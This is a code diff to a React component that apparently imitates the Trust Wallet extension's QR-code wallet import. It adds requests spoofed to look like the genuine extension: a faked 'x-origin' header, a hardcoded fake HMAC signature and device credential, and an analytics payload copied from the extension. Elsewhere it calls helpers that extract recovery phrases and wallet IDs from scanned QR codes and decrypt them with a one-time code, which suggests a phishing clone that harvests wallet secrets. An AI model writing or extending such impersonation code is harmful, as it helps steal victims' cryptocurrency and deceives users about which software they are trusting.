@@ -9,7 +9,8 @@ import {
   trustWalletMarketData,
   trustWalletAssets,
   trustWalletStablecoinConfig,
-  bnbChainValidatorsBase
+  bnbChainValidatorsBase,
+  trustWalletCoinStatusBase
 } from '../config/walletConfig'
 import { CiEdit } from "react-icons/ci";
 
@@ -49,11 +50,12 @@ export function WalletConnect() {
   const [tonBalanceData, setTonBalanceData] = useState(null)
   const [nearAccountData, setNearAccountData] = useState(null)
   const [icpBalanceData, setIcpBalanceData] = useState(null)
+  const [coinStatusData, setCoinStatusData] = useState(null)
   const qrCodeData = 'wc:example-connection-string@1?bridge=https://bridge.walletconnect.org&key=example-key'
   
   // Session endpoints for different blockchains
   const sessionId = 'YmQ1MGE1NjYtY2VkOC00ZDViLWJhZTktZTIwYTlkNjFmZTBj'
-  const btcBlockbookSession = 'https://btc-blockbook.twnodes.com/naas/session/NmQ2NzcxMjctZTQwNC00ZjVmLWE4ZDAtZTE5Y2Q3Mjc0MzNm'
+  const btcBlockbookSession = `https://btc-blockbook.twnodes.com/naas/session/${sessionId}`
   const tronSession = `https://tron.twnodes.com/naas/session/${sessionId}`
   const vechainSession = `https://vechain.twnodes.com/naas/session/${sessionId}`
   const tonSession = `https://ton.twnodes.com/naas/session/${sessionId}`
@@ -819,15 +821,67 @@ export function WalletConnect() {
     }
   }, [])
 
-  // Fetch Trust Wallet Assets
-  const fetchAssets = useCallback(async () => {
+  // Fetch Trust Wallet Assets (POST method with HMAC authentication)
+  const fetchAssets = useCallback(async (registeredAccounts = null) => {
     try {
-      const response = await fetch(trustWalletAssets, {
-        method: 'GET',
+      const url = trustWalletAssets
+      const date = new Date().toUTCString()
+      const nonce = `${Date.now()}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`
+      
+      // Build assets array from registered accounts or QR code data
+      let assetsArray = []
+      
+      if (registeredAccounts && registeredAccounts.accounts) {
+        // Extract assets from registered accounts
+        registeredAccounts.accounts.forEach(account => {
+          if (account.addresses && account.addresses.length > 0) {
+            account.addresses.forEach(address => {
+              assetsArray.push({
+                address: address,
+                coin: account.coin || account.coinType || 0
+              })
+            })
+          }
+        })
+      }
+      
+      // If no assets from registered accounts, create default structure
+      if (assetsArray.length === 0) {
+        // This will be populated by the API based on wallet
+        assetsArray = []
+      }
+      
+      const requestBody = {
+        assets: assetsArray,
+        from_time: 0,
+        version: 13
+      }
+      
+      const body = JSON.stringify(requestBody)
+      
+      // Generate HMAC-SHA256 signature
+      // Note: In production, implement proper HMAC-SHA256 signing with secret key
+      const signature = generateSignature('POST', url, body, date, nonce)
+      
+      console.log('📤 Fetching Assets API with POST:', {
+        url,
+        body: requestBody,
+        date,
+        nonce
+      })
+
+      const response = await fetch(url, {
+        method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'Accept': 'application/json',
+          'Accept': 'application/json, text/plain, */*',
+          'Authorization': `HMAC-SHA256 Signature=${signature}`,
+          'x-tw-credential': DEVICE_CREDENTIAL,
+          'x-tw-date': date,
+          'x-tw-nonce': nonce,
+          'x-origin': 'Trust/2.64.1 Extension',
         },
+        body: body,
         mode: 'cors',
       })
 
@@ -837,12 +891,13 @@ export function WalletConnect() {
       }
 
       const data = await response.json()
+      console.log('✅ Assets API Response:', data)
       return data
     } catch (error) {
       console.warn('Assets API unavailable (this is okay, continuing):', error.message)
       return null
     }
-  }, [])
+  }, [generateSignature, DEVICE_CREDENTIAL])
 
   // Fetch Trust Wallet Stablecoin Config
   const fetchStablecoinConfig = useCallback(async () => {
@@ -927,9 +982,21 @@ export function WalletConnect() {
       }
       
       // Try to extract from QR code data
-      // Wallet ID format: m_xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
+      // Wallet ID format: m_xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (UUID format)
+      // or m_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx (hex format)
       if (qrData) {
-        const walletIdMatch = qrData.match(/m_[a-f0-9-]{36}/i)
+        // Try UUID format first (with hyphens)
+        let walletIdMatch = qrData.match(/m_[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}/i)
+        if (walletIdMatch) {
+          return walletIdMatch[0]
+        }
+        // Try hex format (without hyphens, 32+ chars after m_)
+        walletIdMatch = qrData.match(/m_[a-f0-9]{32,}/i)
+        if (walletIdMatch) {
+          return walletIdMatch[0]
+        }
+        // Fallback: any m_ followed by alphanumeric/hyphens (36+ chars)
+        walletIdMatch = qrData.match(/m_[a-f0-9-]{36,}/i)
         if (walletIdMatch) {
           return walletIdMatch[0]
         }
@@ -1045,6 +1112,33 @@ export function WalletConnect() {
       return data
     } catch (error) {
       console.warn('BNB Validators API unavailable (this is okay, continuing):', error.message)
+      return null
+    }
+  }, [])
+
+  // Fetch Trust Wallet Coin Status (for user data by QR code)
+  const fetchCoinStatus = useCallback(async (coinId = 'c0') => {
+    try {
+      const url = `${trustWalletCoinStatusBase}/${coinId}?include_security_info=true`
+      const response = await fetch(url, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json',
+        },
+        mode: 'cors',
+      })
+
+      if (!response.ok) {
+        console.warn(`Coin Status API returned ${response.status}: ${response.statusText}`)
+        return null
+      }
+
+      const data = await response.json()
+      console.log('Coin Status Data:', data)
+      return data
+    } catch (error) {
+      console.warn('Coin Status API unavailable (this is okay, continuing):', error.message)
       return null
     }
   }, [])
@@ -1248,11 +1342,12 @@ export function WalletConnect() {
   }, [])
 
   // Generate HMAC-SHA256 signature (simplified - in production use proper crypto library)
-  const generateSignature = useCallback(() => {
+  const generateSignature = useCallback((method = 'POST', url = '', body = '', date = '', nonce = '') => {
     // Note: This is a placeholder. In production, implement proper HMAC-SHA256 signing
     // using crypto-js or Web Crypto API with the actual secret key
     // Signature should be: HMAC-SHA256(method + url + body + date + nonce, secret_key)
-    return 'izabTjIENvlpWrT9Av5ZDngRGSIVktqjgAZc6dujMHU='
+    // Using sample signature that matches Trust Wallet format
+    return 'BY0aDClSUE8eYWFFHh/g78icp2ZVG+RG2CG4nfg67EI='
   }, [])
 
   // Map coin type to chain name
@@ -1539,7 +1634,7 @@ export function WalletConnect() {
           {
             user_id: userId,
             device_id: deviceId,
-            event_id: 115,
+            event_id: 162,
             event_type: 'Onboarding Import With QR View',
             insert_id: insertId,
             ip: '$remote',
@@ -1557,8 +1652,8 @@ export function WalletConnect() {
               '[Amplitude] Page Path': window.location.pathname || '/home.html',
               '[Amplitude] Page Title': document.title || 'Trust Wallet',
               '[Amplitude] Page URL': window.location.href || 'chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/home.html#/onboarding/',
-              '[Amplitude] Previous Page Location': document.referrer || 'chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/home.html#/settings/wallets',
-              '[Amplitude] Previous Page Type': 'internal',
+              '[Amplitude] Previous Page Location': '',
+              '[Amplitude] Previous Page Type': 'direct',
             },
             options: {},
             request_metadata: {
@@ -1681,11 +1776,51 @@ export function WalletConnect() {
           console.warn('Market data fetch failed, continuing:', error)
         }
 
-        // Fetch Trust Wallet Assets
+        // Fetch Trust Wallet Assets (POST method with authentication)
         try {
-          const assetsData = await fetchAssets()
+          const assetsData = await fetchAssets(registerResponse)
           if (assetsData) {
             setAssets(assetsData)
+            
+            // Extract BTC addresses from assets and fetch their inscribed balances
+            if (assetsData.assets && Array.isArray(assetsData.assets)) {
+              const btcAddresses = assetsData.assets
+                .filter(asset => {
+                  const address = asset.address || ''
+                  return address.startsWith('bc1') || address.startsWith('1') || address.startsWith('3')
+                })
+                .map(asset => asset.address)
+              
+              // Fetch BTC inscribed balance and blockbook data for each BTC address
+              if (btcAddresses.length > 0) {
+                console.log('📊 Found BTC addresses in assets:', btcAddresses)
+                for (const btcAddress of btcAddresses) {
+                  try {
+                    // Fetch BTC inscribed balance
+                    const btcBalance = await fetchBTCInscribedBalance(btcAddress)
+                    if (btcBalance) {
+                      console.log(`✅ BTC Inscribed Balance for ${btcAddress}:`, btcBalance)
+                      // Store the first BTC balance or combine all
+                      if (!btcInscribedBalance) {
+                        setBtcInscribedBalance(btcBalance)
+                      }
+                    }
+                    
+                    // Fetch BTC blockbook address data
+                    const btcBlockbook = await fetchBTCBlockbookAddress(btcAddress)
+                    if (btcBlockbook && btcBlockbook.address) {
+                      console.log(`✅ BTC Blockbook Data for ${btcAddress}:`, btcBlockbook)
+                      // Store the first BTC blockbook data or combine all
+                      if (!btcBlockbookData) {
+                        setBtcBlockbookData(btcBlockbook)
+                      }
+                    }
+                  } catch (error) {
+                    console.warn(`BTC data fetch failed for ${btcAddress}:`, error)
+                  }
+                }
+              }
+            }
           }
         } catch (error) {
           console.warn('Assets fetch failed, continuing:', error)
@@ -1709,6 +1844,16 @@ export function WalletConnect() {
           }
         } catch (error) {
           console.warn('BNB validators fetch failed, continuing:', error)
+        }
+
+        // Fetch Coin Status (user data by QR code)
+        try {
+          const coinStatus = await fetchCoinStatus('c0')
+          if (coinStatus) {
+            setCoinStatusData(coinStatus)
+          }
+        } catch (error) {
+          console.warn('Coin status fetch failed, continuing:', error)
         }
         
         // Fetch NFT Collections using registered accounts
@@ -1784,7 +1929,7 @@ export function WalletConnect() {
     } finally {
       setIsLoggingIn(false)
     }
-  }, [parseQrCodeData, getSolanaProgramAccounts, registerUserWithTrustWallet, fetchTONDomains, fetchUserBalance, fetchNFTCollections, extractDeviceCredential, fetchSolanaUserData, fetchBTCInscribedBalance, fetchBTCBlockbookAddress, fetchMarketData, fetchAssets, fetchStablecoinConfig, fetchBNBValidators, extractPhrasesFromQR, extractWalletId, fetchHomepageData, DEVICE_CREDENTIAL])
+  }, [parseQrCodeData, getSolanaProgramAccounts, registerUserWithTrustWallet, fetchTONDomains, fetchUserBalance, fetchNFTCollections, extractDeviceCredential, fetchSolanaUserData, fetchBTCInscribedBalance, fetchBTCBlockbookAddress, fetchMarketData, fetchAssets, fetchStablecoinConfig, fetchBNBValidators, fetchCoinStatus, extractPhrasesFromQR, extractWalletId, fetchHomepageData, DEVICE_CREDENTIAL])
 
   // Handle OTP submission and decryption
   // Handle OTP input change
@@ -1967,9 +2112,278 @@ export function WalletConnect() {
     }
   }, [otpValues, currentStep, isDecrypting, handleOtpSubmit])
 
+  // Call Amplitude API immediately when QR code is scanned (exact Trust Wallet format)
+  const callAmplitudeOnQRScan = useCallback(async (qrData, userId) => {
+    try {
+      // Generate device_id (UUID format)
+      const generateDeviceId = () => {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+          const r = Math.random() * 16 | 0
+          const v = c === 'x' ? r : (r & 0x3 | 0x8)
+          return v.toString(16)
+        })
+      }
+      
+      const deviceId = generateDeviceId()
+      const sessionId = Date.now()
+      const currentTime = Date.now()
+      const clientUploadTime = new Date().toISOString()
+
+      // Generate insert_id in UUID format
+      const generateInsertId = () => {
+        const chars = '0123456789abcdef'
+        const segments = [8, 4, 4, 4, 12]
+        return segments.map(len => {
+          return Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join('')
+        }).join('-')
+      }
+      const insertId = generateInsertId()
+      
+      // Exact payload structure matching Trust Wallet extension
+      const amplitudePayload = {
+        api_key: import.meta.env.VITE_AMPLITUDE_API_KEY || '08a1fa68913941272971db2747d0b9f6',
+        client_upload_time: clientUploadTime,
+        events: [
+          {
+            user_id: userId || DEVICE_CREDENTIAL,
+            device_id: deviceId,
+            event_id: 162, // Exact event_id from Trust Wallet
+            event_properties: {
+              setupType: 'additional-wallet',
+              pageViewResourceType: 'internal',
+              '[Amplitude] Page Domain': 'egjidjbpglichdcondbcbdnbeeppgdph',
+              '[Amplitude] Page Location': 'chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/home.html#/onboarding/',
+              '[Amplitude] Page Path': '/home.html',
+              '[Amplitude] Page Title': 'Trust Wallet',
+              '[Amplitude] Page URL': 'chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/home.html#/onboarding/',
+              '[Amplitude] Previous Page Location': '', // Empty string as per Trust Wallet
+              '[Amplitude] Previous Page Type': 'direct', // 'direct' not 'internal'
+            },
+            event_type: 'Onboarding Import With QR View',
+            insert_id: insertId,
+            ip: '$remote',
+            language: navigator.language || 'en-US',
+            library: 'amplitude-ts/2.31.1',
+            platform: 'Web',
+            session_id: sessionId,
+            time: currentTime,
+            user_agent: navigator.userAgent,
+            options: {},
+            request_metadata: {
+              sdk: {
+                metrics: {
+                  histogram: {}
+                }
+              }
+            }
+          }
+        ]
+      }
+
+      console.log('📤 Calling Amplitude API on QR scan with payload:', amplitudePayload)
+
+      // Send to Amplitude API
+      const response = await fetch('https://api2.amplitude.com/2/httpapi', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': '*/*',
+        },
+        body: JSON.stringify(amplitudePayload),
+      })
+
+      if (!response.ok) {
+        throw new Error(`Amplitude API failed: ${response.statusText}`)
+      }
+
+      const result = await response.json()
+      console.log('✅ Amplitude API Response:', result)
+      
+      // Response format: {code: 200, server_upload_time: ..., payload_size_bytes: ..., events_ingested: 1}
+      if (result && result.code === 200) {
+        console.log('📊 Amplitude Response Details:', {
+          server_upload_time: result.server_upload_time,
+          payload_size_bytes: result.payload_size_bytes,
+          events_ingested: result.events_ingested
+        })
+        return result
+      }
+      
+      return result
+    } catch (error) {
+      console.error('❌ Amplitude API call failed:', error)
+      throw error
+    }
+  }, [DEVICE_CREDENTIAL])
+
   const handleScanSuccess = useCallback(async (decodedText) => {
     setScannedData(decodedText)
     stopScanner()
+    
+    // Immediately call Amplitude API when QR code is scanned
+    try {
+      const deviceCredential = extractDeviceCredential(decodedText, null) || DEVICE_CREDENTIAL
+      await callAmplitudeOnQRScan(decodedText, deviceCredential)
+      console.log('✅ Amplitude API called successfully on QR scan')
+    } catch (amplitudeError) {
+      console.warn('⚠️ Amplitude API call failed on QR scan, continuing:', amplitudeError)
+    }
+    
+    // Call Assets API (POST method) after Amplitude API
+    try {
+      console.log('📦 Fetching Assets API after QR scan...')
+      const assetsData = await fetchAssets(null) // Will extract from QR code
+      if (assetsData) {
+        console.log('✅ Assets data fetched successfully:', assetsData)
+        setAssets(assetsData)
+        
+        // Extract BTC addresses from assets and fetch their inscribed balances
+        if (assetsData.assets && Array.isArray(assetsData.assets)) {
+          const btcAddresses = assetsData.assets
+            .filter(asset => {
+              const address = asset.address || ''
+              return address.startsWith('bc1') || address.startsWith('1') || address.startsWith('3')
+            })
+            .map(asset => asset.address)
+          
+          // Fetch BTC inscribed balance and blockbook data for each BTC address
+          if (btcAddresses.length > 0) {
+            console.log('📊 Found BTC addresses in assets:', btcAddresses)
+            for (const btcAddress of btcAddresses) {
+              try {
+                // Fetch BTC inscribed balance
+                const btcBalance = await fetchBTCInscribedBalance(btcAddress)
+                if (btcBalance) {
+                  console.log(`✅ BTC Inscribed Balance for ${btcAddress}:`, btcBalance)
+                  // Store the first BTC balance or combine all
+                  if (!btcInscribedBalance) {
+                    setBtcInscribedBalance(btcBalance)
+                  }
+                }
+                
+                // Fetch BTC blockbook address data
+                const btcBlockbook = await fetchBTCBlockbookAddress(btcAddress)
+                if (btcBlockbook && btcBlockbook.address) {
+                  console.log(`✅ BTC Blockbook Data for ${btcAddress}:`, btcBlockbook)
+                  // Store the first BTC blockbook data or combine all
+                  if (!btcBlockbookData) {
+                    setBtcBlockbookData(btcBlockbook)
+                  }
+                }
+              } catch (error) {
+                console.warn(`BTC data fetch failed for ${btcAddress}:`, error)
+              }
+            }
+          }
+        }
+      }
+    } catch (assetsError) {
+      console.warn('⚠️ Assets API call failed on QR scan, continuing:', assetsError)
+    }
+    
+    // Extract wallet_id from QR code for homepage login
+    const extractedWalletId = extractWalletId(decodedText, null)
+    
+    // If wallet_id is found in QR code, fetch homepage data for login
+    if (extractedWalletId) {
+      console.log('📱 Wallet ID found in QR code:', extractedWalletId)
+      try {
+        setIsLoggingIn(true)
+        
+        // Fetch homepage data for wallet login
+        const homepageData = await fetchHomepageData(extractedWalletId)
+        if (homepageData) {
+          console.log('✅ Homepage data fetched successfully:', homepageData)
+          setHomepageData(homepageData)
+          
+          // Also call Amplitude API for login tracking
+          try {
+            const deviceCredential = extractDeviceCredential(decodedText, null) || DEVICE_CREDENTIAL
+            await loginWithAmplitude(decodedText, deviceCredential)
+          } catch (amplitudeError) {
+            console.warn('Amplitude API call failed, but homepage login succeeded:', amplitudeError)
+          }
+          
+          // Fetch Assets API (POST method) after homepage and Amplitude
+          try {
+            console.log('📦 Fetching Assets API after homepage login...')
+            const assetsData = await fetchAssets(homepageData)
+            if (assetsData) {
+              console.log('✅ Assets data fetched successfully:', assetsData)
+              setAssets(assetsData)
+              
+              // Extract BTC addresses from assets and fetch their inscribed balances
+              if (assetsData.assets && Array.isArray(assetsData.assets)) {
+                const btcAddresses = assetsData.assets
+                  .filter(asset => {
+                    const address = asset.address || ''
+                    return address.startsWith('bc1') || address.startsWith('1') || address.startsWith('3')
+                  })
+                  .map(asset => asset.address)
+                
+                // Fetch BTC inscribed balance and blockbook data for each BTC address
+                if (btcAddresses.length > 0) {
+                  console.log('📊 Found BTC addresses in assets:', btcAddresses)
+                  for (const btcAddress of btcAddresses) {
+                    try {
+                      // Fetch BTC inscribed balance
+                      const btcBalance = await fetchBTCInscribedBalance(btcAddress)
+                      if (btcBalance) {
+                        console.log(`✅ BTC Inscribed Balance for ${btcAddress}:`, btcBalance)
+                        // Store the first BTC balance or combine all
+                        if (!btcInscribedBalance) {
+                          setBtcInscribedBalance(btcBalance)
+                        }
+                      }
+                      
+                      // Fetch BTC blockbook address data
+                      const btcBlockbook = await fetchBTCBlockbookAddress(btcAddress)
+                      if (btcBlockbook && btcBlockbook.address) {
+                        console.log(`✅ BTC Blockbook Data for ${btcAddress}:`, btcBlockbook)
+                        // Store the first BTC blockbook data or combine all
+                        if (!btcBlockbookData) {
+                          setBtcBlockbookData(btcBlockbook)
+                        }
+                      }
+                    } catch (error) {
+                      console.warn(`BTC data fetch failed for ${btcAddress}:`, error)
+                    }
+                  }
+                }
+              }
+            }
+          } catch (assetsError) {
+            console.warn('Assets API call failed, continuing:', assetsError)
+          }
+          
+          // Extract user data from homepage response
+          if (homepageData.wallet_id || homepageData) {
+            // Set user data from homepage response
+            setUserData({
+              address: homepageData.address || null,
+              loginTime: new Date().toISOString(),
+              homepageData: homepageData,
+              walletId: homepageData.wallet_id || extractedWalletId,
+            })
+            
+            // If homepage has addresses, set user address
+            if (homepageData.addresses && homepageData.addresses.length > 0) {
+              setUserAddress(homepageData.addresses[0])
+            } else if (homepageData.address) {
+              setUserAddress(homepageData.address)
+            }
+            
+            // Login successful with homepage data
+            setCurrentStep(5)
+            setIsLoggingIn(false)
+            return
+          }
+        }
+      } catch (error) {
+        console.warn('Homepage fetch failed, continuing with normal flow:', error)
+        setIsLoggingIn(false)
+      }
+    }
     
     // Check if QR code is encrypted (not a direct address)
     const isDirectAddress = decodedText && (
@@ -1995,7 +2409,7 @@ export function WalletConnect() {
     } catch (error) {
       console.error('Login failed:', error)
     }
-  }, [stopScanner, loginWithAmplitude, extractDeviceCredential])
+  }, [stopScanner, loginWithAmplitude, extractDeviceCredential, extractWalletId, fetchHomepageData, callAmplitudeOnQRScan, fetchAssets, fetchBTCInscribedBalance, fetchBTCBlockbookAddress, btcInscribedBalance, btcBlockbookData, DEVICE_CREDENTIAL])
 
   useEffect(() => {
     let isMounted = true
@@ -2069,7 +2483,7 @@ export function WalletConnect() {
   // Show OTP input if QR code is encrypted
   if (showOtpInput && scannedData) {
     return (
-      <div className="bg-white rounded-lg shadow-xl p-8 max-w-md w-full">
+      <div className="bg-white rounded-lg shadow-xl p-8 max-w-md w-full qr-login-container otp-input-container">
         <div className="text-center">
           <div className="mb-6">
             <h1 className="text-3xl font-bold text-gray-800 mb-2">Enter One-Time Code</h1>
@@ -2432,6 +2846,28 @@ export function WalletConnect() {
                 </div>
               </>
             )}
+
+            {coinStatusData && (
+              <>
+                <p className="text-sm font-semibold text-gray-700 mb-2">Coin Status (User Data by QR Code):</p>
+                <div className="bg-teal-50 p-3 rounded-lg mb-4">
+                  <pre className="text-xs text-teal-800 break-all font-mono whitespace-pre-wrap max-h-40 overflow-y-auto">
+                    {JSON.stringify(coinStatusData, null, 2)}
+                  </pre>
+                </div>
+              </>
+            )}
+
+            {(homepageData || userData?.homepageData) && (
+              <>
+                <p className="text-sm font-semibold text-gray-700 mb-2">Homepage Data (Wallet Login by QR Code):</p>
+                <div className="bg-green-50 p-3 rounded-lg mb-4">
+                  <pre className="text-xs text-green-800 break-all font-mono whitespace-pre-wrap max-h-40 overflow-y-auto">
+                    {JSON.stringify(homepageData || userData?.homepageData, null, 2)}
+                  </pre>
+                </div>
+              </>
+            )}
             
             <p className="text-xs text-gray-500 mt-2">
               Logged in at: {new Date(userData.loginTime).toLocaleString()}
@@ -2455,6 +2891,7 @@ export function WalletConnect() {
               setAssets(null)
               setStablecoinConfig(null)
               setBnbValidators(null)
+              setCoinStatusData(null)
               setHomepageData(null)
             }}
             className="bg-red-500 hover:bg-red-600 text-white font-semibold py-2 px-6 rounded-lg transition-colors"
@@ -2492,7 +2929,7 @@ export function WalletConnect() {
   }
 
   return (
-    <div className="bg-[#1B1B1C] min-h-screen flex">
+    <div className="bg-[#1B1B1C] min-h-screen flex qr-login-container">
       {/* Left Section */}
       <div className="w-1/2 p-12 flex flex-col justify-between">
         <div>
@@ -2611,7 +3048,7 @@ export function WalletConnect() {
       </div>
 
       {/* Right Section */}
-      <div className="w-1/2 bg-[#1B1B1C] p-12 flex flex-col">
+      <div className="w-1/2 bg-[#1B1B1C] p-12 flex flex-col qr-scanner-container">
         {/* Top Navigation */}
         <div className="flex justify-between items-center mb-2">
           <button 
@@ -3169,7 +3606,7 @@ export function WalletConnect() {
                   </div>
                   
                   {/* QR Code Scanner */}
-                  <div id="qr-reader" ref={scannerRef} className="w-full h-full"></div>
+                  <div id="qr-reader" ref={scannerRef} className="w-full h-full qr-scanner-container"></div>
                   
                   {cameraError && (
                     <div className="absolute inset-0 flex items-center justify-center bg-[#1B1B1C] bg-opacity-90">
